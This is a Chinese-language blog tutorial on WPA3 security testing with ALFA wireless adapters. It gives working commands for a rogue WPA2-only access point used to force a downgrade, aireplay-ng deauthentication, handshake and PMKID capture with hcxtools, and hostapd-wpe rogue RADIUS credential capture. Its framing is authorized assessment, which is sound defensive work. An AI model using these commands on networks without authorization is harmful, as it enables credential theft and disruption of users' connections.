---
title: "使用 ALFA 无线网卡进行 WPA3 安全测试（2026）"
description: "使用 ALFA Network 无线网卡进行 WPA3 安全测试的完整指南。涵盖 SAE 握手分析、Dragonblood 漏洞、过渡模式降级攻击、PMF 强制执行以及 WPA3-Enterprise EAP 测试。"
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
---

{{< alert "triangle-exclamation" >}}
**法律声明：** 所有无线安全测试必须仅在您拥有明确书面授权的网络和设备上进行。WPA3 测试技术（包括 SAE 捕获、去认证及流氓 AP 部署）与其他任何无线评估活动受相同的法律约束。仅限授权测试。
{{< /alert >}}

WPA3 在个人和企业无线安全方面相较 WPA2 有了显著提升。同等认证（SAE）以基于密码的密钥交换取代了预共享密钥（PSK）握手，能够抵御离线字典攻击。保护管理帧（PMF）为强制要求，并内置了前向保密性。

然而，WPA3 并非毫无漏洞。Dragonblood 研究（2019 年）揭示了 SAE 握手中的侧信道漏洞和拒绝服务漏洞。过渡模式引入了降级攻击面。企业部署面临与 WPA2-Enterprise 相同的 802.1X 证书验证弱点。本指南介绍使用 ALFA Network 无线网卡进行完整 WPA3 安全测试的方法论——这些网卡提供了全面评估所需的监控模式稳定性和注入能力。

---

## 面向安全测试人员的 WPA3 基础知识

### SAE：同等认证

SAE 以基于 Dragonfly 密钥交换协议的零知识证明交换取代了 WPA2-PSK 的四次握手。对安全测试而言最重要的特性是**前向保密性**：即使事后 Wi-Fi 密码遭到泄露，此前捕获的流量也无法被解密。这消除了针对纯 SAE 网络进行离线密码破解的主要价值。

SAE 同时消除了影响 WPA2 的 PMKID 攻击漏洞。被动攻击者无法从 SAE 关联中提取任何等效的可离线破解的数据。

### PMF：WPA3 的强制要求

802.11w 保护管理帧在 WPA3 中为强制要求。去认证和解除关联帧受到加密保护，防止了对不启用 PMF 的 WPA2 网络轻而易举奏效的伪造去认证攻击。纯 WPA3 网络应能免疫基于去认证的握手捕获加速手段。

### WPA3 过渡模式

最常见的现实部署场景是 **WPA3 过渡模式**：AP 同时接受 WPA3-SAE 和 WPA2-PSK 认证，以保持对不支持 WPA3 设备的向后兼容性。该模式是当前企业环境中的主要攻击面——它在一个宣称支持 WPA3 的网络上重新引入了 WPA2 PSK 握手暴露风险。

### WPA3-Enterprise

WPA3-Enterprise 要求采用 192 位安全模式，使用 GCMP-256 和 HMAC-SHA-384，并进行基于证书的双向认证。若部署不当，它面临与 WPA2-Enterprise 相同的证书验证漏洞。802.1X 层的测试方法详见[企业无线安全评估框架](/zh-cn/blog/enterprise-wireless-security-assessment/)。

---

## 测试环境与网卡要求

### 网卡选择

WPA3 测试需要一块具备可靠监控模式、注入支持的网卡，针对 6 GHz WPA3 网络还需三频能力：

- **AWUS036AXML** — Wi-Fi 6E（6 GHz）WPA3 网络的必备之选。搭载 Mediatek MT7921AUN 芯片组。在 Kali Linux（内核 5.18+）上完整支持监控模式和注入。该 ALFA 网卡是唯一覆盖 6 GHz 频段的型号，而该频段上的纯 WPA3 部署日益普遍。
- **AWUS036ACH** — 适用于 2.4/5 GHz WPA3 测试。RTL8812AU 芯片组。与 aircrack-ng 工具链兼容性最佳，在各 Kali Linux 版本中驱动支持最广泛。

### 启用监控模式

```bash
# 终止干扰进程
sudo airmon-ng check kill

# 启动监控模式
sudo airmon-ng start wlan0

# 验证监控接口
iwconfig wlan0mon
```

完整的监控模式设置指南请参见[在 Kali Linux 上启用监控模式](/zh-cn/blog/enable-monitor-mode-kali-linux/)。

### 在扫描结果中识别 WPA3 网络

```bash
# 跨所有频段进行被动扫描
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# 在结果中过滤 WPA3 网络
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

在 airodump-ng 输出中，WPA3-SAE 网络在 AUTH 列显示 `WPA3 SAE`。过渡模式网络显示 `WPA2 WPA3 SAE PSK`。开放式（OWE）增强网络显示 `OWE`。

---

## 阶段一：SAE 握手捕获与分析

### 被动捕获的局限性

与 WPA2 不同，**SAE 握手不能用于离线字典攻击**。使用任何监控模式网卡都可以直接捕获 SAE commit 和 confirm 帧，但捕获的内容不会产生可破解的哈希值。捕获 SAE 帧的目的在于协议层分析——验证使用的是正确的 SAE 变体、确认 PMF 已协商，并为评估报告提供证据。

```bash
# 在目标 AP 信道上捕获
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# 在 Wireshark 中分析捕获文件
# 过滤器：wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# （0x000b = 认证帧）
wireshark -r sae_capture-01.cap
```

在认证帧中，验证 SAE commit 和 confirm 交换过程。Beacon 帧中的 RSN 信息元素应显示：
- **AKM Suite**：WPA3-Personal 对应 00-0F-AC:8（SAE）
- **PMF**：Required（RSN Capabilities 中 MFPR 位已置位）

### 对 SAE 网络进行 PMKID 测试

hcxdumptool 等工具会尝试对所有网络提取 PMKID，但 SAE 网络不会暴露可破解的 PMKID。运行该工具有助于确认不存在 WPA2 PMKID 暴露：

```bash
# 尝试 PMKID 捕获——SAE 网络不应产生可破解的 PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# 转换并检查
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# 空文件或文件不存在即确认无 WPA2 PMKID 暴露
wc -l wpa3_hashes.hc22000
```

如果 `hcxpcapngtool` 对一个宣称为纯 WPA3 的网络输出了非空的 `.hc22000` 文件，说明该 AP 正在过渡模式下运行并暴露了 WPA2 PMKID——这是一项重大发现。

---

## 阶段二：过渡模式降级攻击测试

### 降级攻击面

WPA3 过渡模式是当前企业环境中影响最大的 WPA3 漏洞。当 AP 以过渡模式运行时，它同时接受 SAE 和 PSK 关联。能够观察客户端探测请求的攻击者可以构造一个对同一 SSID 仅呈现 WPA2-PSK 能力的流氓 AP——如果客户端在不要求 SAE 的情况下连接，标准的 WPA2 四次握手将被捕获，并可被离线攻击。

### 测试流程

```bash
# 第一步：确认目标处于过渡模式（airodump-ng 中显示 WPA2+WPA3）
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# 第二步：捕获合法 AP 的 Beacon 帧，记录其信道和配置
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# 第三步：使用 hostapd 在同一信道上创建仅支持 WPA2 的流氓 AP
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# 第四步：监控流氓 AP 上的客户端关联
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**关键发现：** 如果此前通过 SAE 连接的客户端关联到了仅支持 WPA2 的流氓 AP（捕获文件中出现四次握手即为证据），说明该客户端操作系统未强制执行 WPA3-SAE 要求。这代表一次成功的降级攻击。

**通过条件：** 客户端忽略仅支持 WPA2 的 AP 或显示警告，且不完成 WPA2 握手。

### hcxpcapngtool 输出中的降级指示

```bash
# 转换流氓 AP 捕获文件——哈希值的存在确认发生了 WPA2 关联
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# 非空输出 = 降级攻击成功
```

---

## 阶段三：Dragonblood 漏洞评估

### 背景

Dragonblood 研究（Vanhoef & Ronen，2019 年）发现了 SAE 握手实现中的多个漏洞：

- **CVE-2019-9494 / CVE-2019-9496**：针对 SAE commit 帧的侧信道攻击（基于缓存和基于时序），允许对未打补丁的实现进行离线字典攻击
- **CVE-2019-9499**：SAE 确认绕过，导致 WPA3-Personal 降级为 WPA2-PSK
- **通过 SAE commit 洪泛进行 DoS**：通过发送大量 SAE commit 帧耗尽 AP 状态表

大多数现代 AP 固件已修补原始 Dragonblood 漏洞。然而，在使用较旧或未打补丁的 AP 固件的环境中，对这些漏洞进行测试仍有必要。

### SAE 防堵塞令牌测试

WPA3-SAE 包含防堵塞机制以防止 commit 洪泛 DoS。测试目标 AP 是否正确实现了防堵塞：

```bash
# 安装 hcxtools
sudo apt install hcxtools

# 使用 hcxdumptool 观察 SAE commit/confirm 帧交换速率限制
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# 在 Wireshark 中过滤认证帧并观察：
# wlan.fc.type_subtype == 0x000b
# 在 commit 帧中查找防堵塞令牌（ACT）响应
wireshark -r dragonblood_test.pcapng
```

在正确实现的 AP 中，来自多个源 MAC 地址的快速 SAE commit 请求应触发防堵塞令牌响应。未实现 ACT 的 AP 易受 SAE commit 洪泛 DoS 攻击。

### 检查 AP 固件版本

AP 固件版本是补丁状态的重要指标。将发现的 AP 固件版本与厂商安全公告进行对比：

- Cisco：安全公告 cisco-sa-wpa3-sae-side-channel（2019 年）
- Aruba：ArubaOS 8.6+ 修补了 Dragonblood
- Ubiquiti：UniFi Network 6.0+ 修补了 Dragonblood
- MikroTik：RouterOS 6.45.7+ 修补了 Dragonblood

在评估报告中记录 AP 固件版本。运行早于上述版本固件的 AP 应被标记为潜在漏洞，无论是否确认了主动利用。

---

## 阶段四：WPA3 网络 PMF 强制执行测试

### PMF 测试的必要性

尽管 PMF 在 WPA3 中为强制要求，但测试实际的强制执行行为仍很重要，原因如下：

1. 过渡模式 AP 在 WPA2 路径上可能将 PMF 设置为"capable"而非"required"，允许对 WPA2 连接的客户端进行去认证攻击
2. AP 配置错误可能导致即使在 SAE 关联上也未协商 PMF
3. 即使 AP 将 PMF 宣告为 required，客户端实现也可能未正确强制执行

### 去认证测试

```bash
# 尝试对通过 WPA3-SAE 关联的测试客户端进行去认证
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# 正确配置的 WPA3 网络预期结果：
# - 测试客户端不断开连接（受 PMF 保护的管理帧被丢弃）
# - airodump-ng 未显示捕获到握手

# 失败条件（发现项）：
# - 测试客户端断开连接并重新关联
# - airodump-ng 捕获到新握手
```

### PMF Capable 与 Required 的区别

```bash
# 捕获 Beacon 帧并解码 RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

输出解读：
- `1,1` — PMF Required（MFPR=1，MFPC=1）：WPA3 的正确配置
- `1,0` — PMF Capable 但非 Required：WPA3 网络上为中危发现，企业 SSID 上为高危
- `0,0` — PMF 已禁用：任何宣称 WPA3 的网络上为高危发现，表明 AP 配置错误

---

## 阶段五：OWE（机会性无线加密）测试

### OWE 概述

OWE（Wi-Fi Enhanced Open）是 WPA3 对完全开放（未加密）访客网络的替代方案。OWE 执行未经认证的 Diffie-Hellman 密钥交换，在无需密码的情况下建立每会话加密。它能防范访客网络上的被动窃听，但不提供认证。

### 测试 OWE 过渡模式

```bash
# 扫描与 OWE 网络配对的隐藏 SSID
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"
```

**发现项：** 如果支持 WPA3 的客户端连接到开放过渡 SSID 而非 OWE SSID，说明该客户端操作系统未正确处理 OWE 过渡模式。该客户端的所有流量均为未加密状态。

---

## 阶段六：WPA3-Enterprise 评估

### 192 位安全模式验证

```bash
# 捕获并解码企业 SSID 的 RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

WPA3-Enterprise 192 位的预期值：
- **Pairwise Cipher Suite**：GCMP-256（00-0F-AC:9）
- **AKM Suite**：EAP-SHA384（00-0F-AC:12）或 FT-EAP-SHA384（00-0F-AC:13）

WPA3-Enterprise 网络出现 CCMP-128 为中危发现。

### 流氓 RADIUS 测试

```bash
# 使用 hostapd-wpe 部署带有流氓 RADIUS 的流氓 AP
sudo apt install hostapd-wpe
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

完整的 EAP/RADIUS 测试流程请参见[企业无线安全评估框架](/zh-cn/blog/enterprise-wireless-security-assessment/)。

---

## WPA3 测试工具包参考

| 工具 | 用途 | 网卡 | 关键命令 |
|---|---|---|---|
| airodump-ng | WPA3 网络发现、SAE 帧捕获 | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | PMKID/SAE 捕获、过渡模式检测 | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | 转换捕获文件、检测过渡模式中的 WPA2 暴露 | 不适用（后处理） | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | RSN IE 分析、PMF 能力、SAE 帧检查 | 任意（通过捕获文件） | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | PMF 强制执行测试（去认证） | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | 用于降级测试的纯 WPA2 流氓 AP | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | 用于 WPA3-Enterprise EAP 测试的流氓 RADIUS | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

---

## WPA3 评估发现项摘要

| 编号 | 严重性 | 发现项 | 条件 |
|---|---|---|---|
| W3-01 | 严重 | WPA3 降级至 WPA2 成功；握手已捕获且可被破解 | 客户端关联至仅支持 WPA2 的流氓 AP；哈希值已恢复 |
| W3-02 | 高危 | 过渡模式下未强制执行 SAE；WPA2 PMKID 已暴露 | hcxpcapngtool 从 WPA3 网络返回可破解的哈希值 |
| W3-03 | 高危 | WPA3 SSID 上未强制执行 PMF；去认证攻击成功 | 测试客户端被 aireplay-ng 去认证断开连接 |
| W3-04 | 高危 | WPA3-Enterprise 客户端接受流氓 RADIUS 且无证书警告 | hostapd-wpe 从测试客户端捕获 EAP 凭据 |
| W3-05 | 中危 | WPA3 SSID 上 PMF 为 Capable 但非 Required | RSN IE 显示 MFPC=1，MFPR=0 |
| W3-06 | 中危 | WPA3-Enterprise 未使用 192 位安全模式 | RSN IE 显示 CCMP-128 而非 GCMP-256 |
| W3-07 | 中危 | AP 固件早于 Dragonblood 补丁版本 | 固件版本与厂商公告对比 |
| W3-08 | 低危 | OWE 过渡模式；传统客户端以未加密方式连接 | 开放 SSID 与 OWE SSID 同时可见 |

---

## 相关资源

- [企业无线安全评估：完整框架](/zh-cn/blog/enterprise-wireless-security-assessment/)
- [数据包注入指南：使用 aireplay-ng 测试您的 WiFi 网卡](/zh-cn/blog/packet-injection-guide/)
- [在 Kali Linux 上启用监控模式](/zh-cn/blog/enable-monitor-mode-kali-linux/)
